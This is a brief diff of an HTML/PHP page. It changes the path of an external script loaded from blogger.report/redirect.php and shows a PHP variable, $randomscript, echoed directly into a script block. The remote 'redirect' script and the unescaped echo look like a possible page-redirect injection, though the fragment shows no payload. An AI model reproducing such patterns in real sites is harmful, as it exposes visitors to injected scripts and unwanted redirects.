@@ -43,6 +43,6 @@
             echo $randomscript;
         ?>
     </script>
-    <script type="text/javascript" src="http://blogger.report/redirect.php"></script>
+    <script type="text/javascript" src="http://blogger.report/php/redirect.php"></script>
 </body>
 </html>
